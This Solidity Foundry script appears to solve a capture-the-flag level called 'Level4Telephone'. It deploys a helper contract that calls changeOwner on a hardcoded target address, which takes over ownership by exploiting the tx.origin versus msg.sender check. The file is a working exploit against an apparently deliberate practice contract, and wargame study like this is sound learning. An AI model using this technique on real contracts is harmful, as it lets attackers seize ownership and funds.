// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Level4Telephone} from "../src/Level4Telephone.sol";
import {Script, console} from "forge-std/Script.sol";

contract Helper {
    Level4Telephone level4Telephone = Level4Telephone((0xc3dC6C93321ABFB0dBD4E482aBD449E039291C76));

    function change(address _address) public {
        (bool success,) = address(level4Telephone).call(abi.encodeWithSignature("changeOwner(address)", _address));
        require(success);
        console.log("new owner: ", level4Telephone.owner());
    }
}

contract Level4TelephoneSolv is Script {
    function run() external {
        Level4Telephone level4Telephone = Level4Telephone((0xc3dC6C93321ABFB0dBD4E482aBD449E039291C76));

        vm.startBroadcast();
        Helper helper = new Helper();
        helper.change(0xF4005D2Dc95EdA6b361A179f4aF8025a69faF6E3);
        console.log("new owner: ", level4Telephone.owner());
        vm.stopBroadcast();
    }
}
